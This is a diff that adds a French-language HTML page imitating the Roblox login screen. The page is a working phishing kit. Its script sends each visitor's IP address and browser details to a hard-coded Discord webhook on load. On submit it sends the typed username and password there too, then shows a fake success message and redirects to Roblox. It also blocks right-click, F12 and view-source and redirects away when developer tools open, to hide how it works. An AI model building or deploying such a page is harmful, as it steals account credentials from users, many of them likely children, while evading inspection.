@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion à Roblox</title>
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/1/1e/Roblox_Logo_2025.png">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #0d0d0d;
+      color: #fff;
+      user-select: none; /* Désactiver la sélection */
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+    }
+
+    /* HEADER */
+    header {
+      background: #1a1a1a;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 30px;
+    }
+
+    .logo {
+      font-size: 22px;
+      font-weight: bold;
+      color: #fff;
+    }
+
+    nav {
+      display: flex;
+      gap: 20px;
+    }
+
+    nav a {
+      color: #fff;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    nav a:hover {
+      text-decoration: underline;
+    }
+
+    .search {
+      flex: 1;
+      margin: 0 20px;
+      display: flex;
+      align-items: center;
+    }
+
+    .search input {
+      width: 100%;
+      padding: 6px 10px;
+      border-radius: 6px;
+      border: 1px solid #444;
+      background: #111;
+      color: #fff;
+    }
+
+    .buttons {
+      display: flex;
+      gap: 10px;
+    }
+
+    .btn-blue {
+      background: #2563eb;
+      border: none;
+      color: white;
+      padding: 6px 14px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .btn-outline {
+      background: transparent;
+      border: 1px solid #999;
+      color: white;
+      padding: 6px 14px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    /* LOGIN BOX */
+    .login-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 80vh;
+    }
+
+    .login-box {
+      background: #1c1c1c;
+      width: 360px;
+      padding: 30px;
+      border-radius: 4px;
+      text-align: center;
+    }
+
+    .login-box h1 {
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border-radius: 4px;
+      border: none;
+      font-size: 15px;
+      background: #2c2c2c;
+      color: #fff;
+      box-sizing: border-box;
+    }
+
+    .login-box input::placeholder {
+      color: #b0b0b0;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border: 1px solid #444;
+      border-radius: 4px;
+      background-color: #2c2c2c;
+      color: #fff;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background-color: #3a3a3a;
+    }
+
+    .login-box a {
+      display: block;
+      margin-top: 15px;
+      color: #cfcfcf;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .login-box a:hover {
+      text-decoration: underline;
+    }
+
+    .small-btn {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 4px;
+      background-color: #3a3a3a;
+      color: #fff;
+      font-size: 14px;
+      cursor: pointer;
+      border: none;
+    }
+
+    .small-btn:hover {
+      background-color: #4a4a4a;
+    }
+
+    /* STATUS MESSAGE */
+    .status-message {
+      margin-top: 15px;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 14px;
+      display: none;
+    }
+
+    .status-success {
+      background-color: #0f5132;
+      color: #d1e7dd;
+      border: 1px solid #41664a;
+    }
+
+    .status-error {
+      background-color: #58151c;
+      color: #f8d7da;
+      border: 1px solid #842029;
+    }
+
+    /* FOOTER */
+    footer {
+      background: #0d0d0d;
+      padding: 20px;
+      text-align: center;
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    footer a {
+      margin: 0 10px;
+      color: #ddd;
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    footer .line {
+      margin: 15px 0;
+      height: 1px;
+      background: #333;
+    }
+  </style>
+</head>
+<body>
+  <!-- HEADER -->
+  <header>
+    <div class="logo">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 8px; vertical-align: middle;">
+        <path d="M6.5 2.5L17.5 21.5L6.5 21.5L17.5 2.5L6.5 2.5Z" transform="rotate(15 12 12)"/>
+      </svg>
+      ROBLOX
+    </div>
+    <nav>
+      <a href="#">Charts</a>
+      <a href="#">Marketplace</a>
+      <a href="#">Créer</a>
+      <a href="#">Robux</a>
+    </nav>
+    <div class="search">
+      <input type="text" placeholder="Rechercher">
+    </div>
+    <div class="buttons">
+      <button class="btn-blue">S'inscrire</button>
+      <button class="btn-outline">Connexion</button>
+    </div>
+  </header>
+
+  <!-- LOGIN -->
+  <div class="login-container">
+    <div class="login-box">
+      <h1>Connexion à Roblox</h1>
+      <form id="loginForm">
+        <input type="text" id="username" placeholder="Identifiant/E-mail/Téléphone" required>
+        <input type="password" id="password" placeholder="Mot de passe" required>
+        <button type="submit" id="loginBtn">Connexion</button>
+      </form>
+
+      <div id="statusMessage" class="status-message"></div>
+
+      <a href="#">Mot de passe ou nom d'utilisateur oublié ?</a>
+      <button class="small-btn">Envoyez-moi un code unique par email</button>
+      <button class="small-btn">Utiliser un autre appareil</button>
+      <a href="#">Vous n'avez pas de compte ? S'inscrire</a>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer>
+    <div>
+      <a href="#">À propos</a>
+      <a href="#">Emplois</a>
+      <a href="#">Blog</a>
+      <a href="#">Parents</a>
+      <a href="#">Cartes-cadeaux</a>
+      <a href="#">Aide</a>
+      <a href="#">Conditions</a>
+      <a href="#">Accessibilité</a>
+      <a href="#">Confidentialité</a>
+      <a href="#">Tes choix en matière de vie privée</a>
+    </div>
+    <div>
+      <a href="#">Options des cookies</a>
+    </div>
+    <div class="line"></div>
+    <p>©2025 Roblox Corporation</p>
+  </footer>
+
+  <script>
+    // Configuration du webhook - Remplacez par votre URL de webhook
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1408202683021529099/b6VSQ72fPLL29P_W2sk-lgeWOa4Nk2fZOHDPAgukRaJMpGxVOrNdeON0dGc9LZdZYUz7';
+    
+    // Variables pour stocker les infos utilisateur
+    let userIP = 'Non disponible';
+    let userAgent = navigator.userAgent;
+
+    // ========== PROTECTION ANTI-F12 ==========
+    
+    // Désactiver le clic droit
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    // Désactiver les raccourcis clavier
+    document.addEventListener('keydown', function(e) {
+      // F12
+      if (e.keyCode === 123) {
+        e.preventDefault();
+        return false;
+      }
+      
+      // Ctrl+Shift+I (Outils développeur)
+      if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+        e.preventDefault();
+        return false;
+      }
+      
+      // Ctrl+Shift+J (Console)
+      if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+        e.preventDefault();
+        return false;
+      }
+      
+      // Ctrl+U (Code source)
+      if (e.ctrlKey && e.keyCode === 85) {
+        e.preventDefault();
+        return false;
+      }
+      
+      // Ctrl+Shift+C (Sélecteur d'élément)
+      if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
+        e.preventDefault();
+        return false;
+      }
+      
+      // Ctrl+S (Sauvegarder)
+      if (e.ctrlKey && e.keyCode === 83) {
+        e.preventDefault();
+        return false;
+      }
+    });
+
+    // Détection de l'ouverture des DevTools
+    let devtools = {
+      open: false,
+      orientation: null
+    };
+
+    const threshold = 160;
+
+    setInterval(() => {
+      if (window.outerHeight - window.innerHeight > threshold || 
+          window.outerWidth - window.innerWidth > threshold) {
+        if (!devtools.open) {
+          devtools.open = true;
+          // Rediriger ou fermer si DevTools détectés
+          window.location.href = 'https://www.google.com';
+        }
+      } else {
+        devtools.open = false;
+      }
+    }, 500);
+
+    // Désactiver la sélection de texte
+    document.addEventListener('selectstart', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    // Désactiver le glisser-déposer
+    document.addEventListener('dragstart', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    // Détection de debug
+    let start = new Date();
+    debugger;
+    let end = new Date();
+    if (end - start > 100) {
+      window.location.href = 'https://www.google.com';
+    }
+
+    // Message d'avertissement
+    console.log('%cARRÊT !', 'color: red; font-size: 50px; font-weight: bold;');
+    console.log('%cCeci est une fonctionnalité de navigateur destinée aux développeurs.', 'color: red; font-size: 16px;');
+
+    // Fonction pour récupérer l'IP
+    async function getUserIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        userIP = data.ip;
+        return data;
+      } catch (error) {
+        console.error('Erreur lors de la récupération de l\'IP:', error);
+        userIP = 'Erreur récupération IP';
+      }
+    }
+
+    // Fonction pour envoyer les infos de visite
+    async function sendVisitInfo() {
+      try {
+        const data = {
+          content: "🔍 **Nouvelle visite sur le site**",
+          embeds: [{
+            title: "Informations de visite",
+            color: 0xff9500,
+            fields: [
+              {
+                name: "📍 Adresse IP",
+                value: userIP,
+                inline: true
+              },
+              {
+                name: "🖥️ Navigateur",
+                value: userAgent,
+                inline: false
+              },
+              {
+                name: "⏰ Timestamp",
+                value: new Date().toLocaleString('fr-FR'),
+                inline: true
+              },
+              {
+                name: "🔗 Page",
+                value: window.location.href,
+                inline: true
+              }
+            ],
+            footer: {
+              text: "Visite détectée automatiquement"
+            }
+          }]
+        };
+
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      } catch (error) {
+        console.error('Erreur lors de l\'envoi de la visite:', error);
+      }
+    }
+
+    // Fonction pour envoyer les données vers le webhook
+    async function sendToWebhook(username, password) {
+      try {
+        const data = {
+          content: "🔐 **Nouvelle tentative de connexion**",
+          embeds: [{
+            title: "Données de connexion",
+            color: 0x2563eb,
+            fields: [
+              {
+                name: "👤 Identifiant",
+                value: username,
+                inline: true
+              },
+              {
+                name: "🔑 Mot de passe",
+                value: password,
+                inline: true
+              },
+              {
+                name: "📍 Adresse IP",
+                value: userIP,
+                inline: true
+              },
+              {
+                name: "🖥️ Navigateur",
+                value: userAgent,
+                inline: false
+              },
+              {
+                name: "⏰ Timestamp",
+                value: new Date().toLocaleString('fr-FR'),
+                inline: true
+              }
+            ],
+            footer: {
+              text: "Site d'apprentissage - Données complètes"
+            }
+          }]
+        };
+
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+
+        return response.ok;
+      } catch (error) {
+        console.error('Erreur lors de l\'envoi vers le webhook:', error);
+        return false;
+      }
+    }
+
+    // Fonction pour afficher un message de statut
+    function showStatus(message, isSuccess = false) {
+      const statusDiv = document.getElementById('statusMessage');
+      statusDiv.textContent = message;
+      statusDiv.className = `status-message ${isSuccess ? 'status-success' : 'status-error'}`;
+      statusDiv.style.display = 'block';
+      
+      // Masquer le message après 5 secondes
+      setTimeout(() => {
+        statusDiv.style.display = 'none';
+      }, 5000);
+    }
+
+    // Gestionnaire du formulaire de connexion
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const loginBtn = document.getElementById('loginBtn');
+      
+      // Désactiver le bouton pendant le traitement
+      loginBtn.disabled = true;
+      loginBtn.textContent = 'Connexion en cours...';
+      
+      try {
+        // Envoyer les données vers le webhook
+        const success = await sendToWebhook(username, password);
+        
+        if (success) {
+          showStatus('Connexion réussie ! Redirection en cours...', true);
+          
+          // Redirection vers Roblox après 2 secondes
+          setTimeout(() => {
+            window.location.href = 'https://roblox.com/home';
+          }, 2000);
+        } else {
+          showStatus('Erreur mot de passe/username incorrect !.');
+        }
+      } catch (error) {
+        console.error('Erreur:', error);
+        showStatus('Erreur technique lors de la connexion.');
+      } finally {
+        // Réactiver le bouton
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'Connexion';
+      }
+    });
+
+    // Initialisation au chargement de la page
+    document.addEventListener('DOMContentLoaded', async function() {
+      // Récupérer l'IP de l'utilisateur
+      await getUserIP();
+      
+      // Envoyer les infos de visite automatiquement
+      await sendVisitInfo();
+      
+      // Bouton "Envoyez-moi un code unique par email"
+      document.querySelectorAll('.small-btn')[0].addEventListener('click', function() {
+        showStatus('Fonctionnalité de démonstration - Code email', true);
+      });
+      
+      // Bouton "Utiliser un autre appareil"
+      document.querySelectorAll('.small-btn')[1].addEventListener('click', function() {
+        showStatus('Fonctionnalité de démonstration - Autre appareil', true);
+      });
+    });
+  </script>
+</body>
+</html>
